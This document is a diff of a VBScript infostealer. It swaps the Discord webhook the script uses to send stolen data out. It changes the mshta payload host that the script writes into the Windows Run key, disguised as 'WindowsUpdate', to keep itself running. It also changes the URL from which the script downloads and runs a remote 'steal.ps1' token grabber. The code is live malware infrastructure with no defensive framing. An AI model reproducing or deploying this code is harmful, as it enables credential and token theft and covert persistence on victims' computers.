@@ -10,7 +10,7 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOK ---
-WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
+WH = "https://canary.discord.com/api/webhooks/1570840795370496181/4RnQm6PLzqjvc-dYZz28S_ttIpmdYJR22ixM4GeIiFYGdWTrRTzxKeWWv6i3TWeD9ARM"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -198,7 +198,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta hahadicexd-production.up.railway.app/"
+    Dim payload : payload = "mshta freezechecklol-production.up.railway.app/"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -216,7 +216,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/hahadicexd/refs/heads/main/steal.ps1", False
+    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
